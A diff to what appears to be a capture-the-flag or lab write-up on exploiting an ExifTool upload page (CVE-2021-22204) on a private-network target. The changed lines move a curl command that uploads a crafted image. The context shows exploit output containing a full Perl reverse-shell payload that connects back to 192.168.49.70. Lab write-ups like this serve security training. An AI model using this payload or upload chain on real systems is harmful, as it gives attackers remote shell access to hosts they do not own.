@@ -71,6 +71,9 @@ echo 'wqer 1234' > test01.txt
 
 curl -F 'myFile=@test01.txt' -k http://192.168.70.183/exiftest.php
 File not allowed.
+
+curl -F 'myFile=@image.jpg' -k http://192.168.70.183/exiftest.php
+jpg file might be allowed
 ```
 
 ### Exploit the exiftool by gooling its version
@@ -88,9 +91,7 @@ RUNNING: UNICORD Exploit for CVE-2021-22204
 PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(7890,inet_aton('192.168.49.70')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
 RUNTIME: DONE - Exploit image written to 'image.jpg'
 ```
-```
-curl -F 'myFile=@image.jpg' -k http://192.168.70.183/exiftest.php
-```
+
 
 ### Got the user.txt
 ##### linpeas
